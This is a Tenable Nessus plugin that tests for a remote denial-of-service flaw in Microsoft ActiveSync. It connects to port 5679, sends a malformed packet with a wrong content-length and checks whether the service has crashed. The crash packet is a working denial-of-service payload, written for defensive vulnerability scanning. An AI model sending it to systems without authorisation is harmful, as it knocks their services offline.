#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11435);
 script_version ("$Revision: 1.6 $");
 script_bugtraq_id(7150);
 script_xref(name:"OSVDB", value:"44696");
 
 script_name(english:"Microsoft ActiveSync WideCharToMultiByte() Function NULL Dereference Remote DoS");
 script_summary(english:"Tests for the overflow in ActiveSync"); 
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host contains a data synchronization program that is
affected by a remote denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote service (probably ActiveSync) could be crashed
by sending it a malformed packet advertising a wrong content-length.

An attacker may use this flaw to disable this service remotely. It is
not clear at this time if this vulnerability can be used to execute
arbitrary code on this host, although it is a possibility." );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value:
"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 
script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Windows");
 script_require_ports(5679);
 exit(0);
}


include('global_settings.inc');

if ( report_paranoia < 2 ) exit(0);

port = 5679;
if(get_port_state(port))
{
 str = raw_string(0x06, 0x00, 0x00, 0x00,
    		 0x24, 0x00, 0x00, 0x00) + crap(124);


 soc = open_sock_tcp(port);
 if(!soc)exit(0);

 send(socket:soc, data:str);
 r = recv(socket:soc, length:1024);
 close(soc);

 soc2 = open_sock_tcp(port);
 if(!soc2)security_warning(port);
}


